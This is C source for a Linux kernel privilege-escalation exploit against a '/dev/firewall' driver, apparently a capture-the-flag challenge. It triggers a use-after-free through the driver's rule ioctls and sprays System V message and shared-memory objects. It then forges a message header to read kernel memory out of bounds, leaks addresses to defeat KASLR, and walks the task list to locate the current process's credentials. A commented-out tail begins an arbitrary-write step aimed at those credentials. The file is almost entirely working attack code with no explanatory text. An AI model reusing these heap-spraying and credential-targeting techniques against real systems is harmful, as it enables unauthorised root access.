#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <byteswap.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <sys/shm.h>

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

int fd;
uint32_t target_idx;
uint64_t target_addr;
uint32_t target_size;
uint64_t race_page;
pthread_t thread;

uint64_t init_ipc_ns, kbase, init_task, init_cred;

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long*)buffer)[i], ((unsigned long long*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0x000000FF, (val & 0x0000FF00) >> 8, (val & 0x00FF0000) >> 16, (val & 0xFF000000) >> 24);
    return;
}

// we have a 0x2d UAF
void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];
    uint32_t netmask = *(uint32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void *)req->iface, input, 0x10);
    memcpy((void *)req->name, (void *)&input[0x10], 0x10);
    memcpy((void *)&req->proto, (void *)&input[0x28], 2);
    memcpy((void *)&req->port, (void *)&input[0x28 + 2], 2);
    memcpy((void *)&req->action, (void *)&input[0x28 + 2 + 2], 1);

    return;
}

int ioctl(int fd, unsigned long request, unsigned long param) //ioctl wrapper
{
    return syscall(__NR_ioctl, fd, request, param);
}

int add(int fd, uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, ADD_RULE, (unsigned long)&rule);
}

int delete(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DELETE_RULE, (unsigned long)&rule);
}

int edit(int fd, uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    return ioctl(fd, EDIT_RULE, (unsigned long)&rule);   
}

int duplicate(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DUP_RULE, (unsigned long)&rule);
}

int32_t make_queue(key_t key, int msgflg)
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

void generic_msg_spray(unsigned int size, unsigned int amount)
{
    int qid;
    char buffer[0x1000];
    msg *spray = (msg *)buffer;

    assert(size >= 0x31 && size <= 0x1000 - 0x8);
    spray->mtype = 1;
    memset(spray->mtext, 0, size);

    if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    for (int i = 0; i < amount; i++)
    {
        if (msgsnd(qid, spray, size - 0x30, 0) == -1)
        {
            perror("msgsend failure");
            exit(-1);
        }
    }
    return;
}

void debug()
{
    puts("pause");
    getchar();
    return;
}



int main(int argc, char **argv, char **envp)
{
    fd = open("/dev/firewall", O_RDONLY);
    char buffer[0x2000], recieved[0x2000];
    memset(buffer, 0, sizeof(buffer));
    memset(recieved, 0, sizeof(recieved));
    msg *message = (msg *)buffer;
    int qid, size;

    memset(buffer, 0, sizeof(buffer));
    memset(buffer, 0x41, 0x40);
    for (int i = 0x50; i < 0x54; i++)
    {
        add(fd, i, buffer, INBOUND);
    }
    add(fd, 0, buffer, INBOUND);
    duplicate(fd, 0, INBOUND);
    qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    // OOB read leak setup
    size = 0x1010;
    message->mtype = 1;
    memset(message->mtext, 0x41, size);

    // trigger UAF
    delete(fd, 0, INBOUND);

    // allocate over old chunk because LIFO
    send_msg(qid, message, size - 0x30, 0);

    // spray shmem structures
    int shmid;
    char *shmaddr;
    for (int i = 0; i < 0x50; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
    }

    msg_header evil;
    size = 0x1400;
    memset((void *)&evil, 0, sizeof(msg_header));
    evil.ll_next = (void *)0x4141414141414141;
    evil.ll_next = (void *)0x4242424242424242;
    evil.m_type = 1;
    evil.m_ts = size;
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, (void *)&evil, 0x20);
    edit(fd, 0, buffer, OUTBOUND, 1);

    // leak stuff
    get_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    printf("0x%016lx\n" ,*(unsigned long*)(recieved + 0xfe0));
    printf("0x%016lx\n" ,*(unsigned long*)(recieved + 0x10d8));
    for (int i = 0; i < size / 8; i++)
    {
        //printf("0x%x: 0x%016lx\n" ,i, *(unsigned long*)(recieved + i*8));
        if ((*(uint64_t *)(recieved + i * 8) & 0xfff) == 0x7a0)
        {
            init_ipc_ns = *(uint64_t *)(recieved + i * 8);
            break;
        }
    }
   kbase = init_ipc_ns - (0xffffffff81c3d7a0 - 0xffffffff81000000);
    init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
    init_cred = kbase + (0xffffffff81c33060 - 0xffffffff81000000);
    printf("[+] init_ipc_ns: 0x%llx\n", init_ipc_ns);
    printf("[+] kbase: 0x%llx\n", kbase);
    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] init_cred: 0x%llx\n", init_cred);

    // offset is 0x298 for tasks dll, walk back via arb read because most recent task, faster to hit
    // pid should be at 0x398
    memset((void *)&evil, 0, sizeof(msg_header));
    memset(recieved, 0, sizeof(recieved));
    memset(buffer, 0, sizeof(buffer));
    evil.m_type = 1;
    evil.m_ts = size;
    evil.next = (void *)init_task + 0x298 - 0x8; // 1 byte null dereference, kurangi 8 byte 
    memcpy(buffer, (void *)&evil, sizeof(msg_header));
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    for(int i=0; i< size / 8; i++){
        printf("0x%x: 0x%016lx\n\n" ,i, *(unsigned long *)(recieved + i * 8));
    }    
    int32_t pid;
    uint64_t prev, curr;
    memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);
    memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);
    printf("%d %d\n", pid, getpid());
    printf("task: 0x%016lx\n" ,*(unsigned long*)&prev);
    printf("pid: 0x%016lx\n" ,*(unsigned long*)&pid); 
    printf("init cred: 0x%016lx\n" ,*(unsigned long*)&init_cred);
    printf("init task: 0x%016lx\n" ,*(unsigned long*)&init_task); 
    printf("init task: 0x%016lx\n" ,*(unsigned long*)&init_task + 0x298 - 0x8); 

    while (pid != getpid())
    {
        curr = prev - 0x298;
        evil.next = (void *)prev - 0x8;
        memcpy(buffer, (void *)&evil, sizeof(msg_header));
        edit(fd, 0, buffer, OUTBOUND, 0);
        get_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);
        memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);
        printf("%d %d\n", pid, getpid());
        printf("task: 0x%016lx\n" ,*(unsigned long*)&prev);
        printf("pid: 0x%016lx\n" ,*(unsigned long*)&pid); 
    }

    printf("[+] found current task struct: 0x%llx\n", curr);
    printf("[+] found Real cred: 0x%llx\n", curr+0x538 - 0x8);
    /*// UAF for arb write
    add(fd, 1, buffer, INBOUND);
    duplicate(fd, 1, INBOUND);
    delete(fd, 1, INBOUND);
    // real_cred and cred is at 0x538 and 0x540
    memset(buffer, 0, sizeof(buffer));
    msg *rooter;
    void *evil_page = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    race_page = 0x1338000;
    rooter = (msg *)(race_page-0x8);
    rooter->mtype = 1;

    size = 0x1010;
    target_idx = 1;
    target_addr = curr + 0x538 - 0x8;*/


}
